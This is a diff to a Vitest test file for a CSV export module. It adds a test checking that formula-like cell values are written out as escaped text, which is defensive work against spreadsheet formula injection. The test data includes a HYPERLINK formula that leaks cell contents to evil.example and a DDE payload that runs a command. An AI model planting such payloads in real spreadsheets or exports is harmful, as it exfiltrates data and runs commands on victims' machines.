@@ -4,7 +4,7 @@
 import { describe, expect, it } from "vitest";
 
 import { ExportForbiddenError, resolveExportScope } from "@/server/research/exports/access";
-import { parseCsv, toCsv } from "@/server/research/exports/csv";
+import { csvText, parseCsv, toCsv } from "@/server/research/exports/csv";
 import { EXPORT_TABLES } from "@/server/research/exports/dictionary";
 
 describe("export scope", () => {
@@ -43,5 +43,33 @@ describe("CSV", () => {
       { a: 'say "hi", then\r\nleave', b: '{"x":[1,2]}', c: "", d: "3.5", e: "true" },
       { a: " padded ", b: "[]", c: "", d: "0", e: "false" },
     ]);
+  });
+
+  it("writes formula-like text as text (spreadsheet formula injection) and leaves numbers alone", () => {
+    const rows = [
+      { v: '=HYPERLINK("https://evil.example/?d="&A1,"open")' },
+      { v: "+x" },
+      { v: "@a" },
+      { v: "-1+cmd|' /C calc'!A0" },
+      { v: "	lead" },
+      { v: "-1.5" },
+      { v: -3 },
+      { v: "2026-10-16T10:00:00.000Z" },
+      { v: "room:loom" },
+    ];
+    const back = parseCsv(toCsv(rows, ["v"])).rows.map((r) => r.v);
+    expect(back).toEqual([
+      `'=HYPERLINK("https://evil.example/?d="&A1,"open")`,
+      "'+x",
+      "'@a",
+      "'-1+cmd|' /C calc'!A0",
+      "'	lead",
+      "-1.5",
+      "-3",
+      "2026-10-16T10:00:00.000Z",
+      "room:loom",
+    ]);
+    // The round-trip helper agrees with what the file holds.
+    expect(rows.map((r) => csvText(r.v))).toEqual(back);
   });
 });
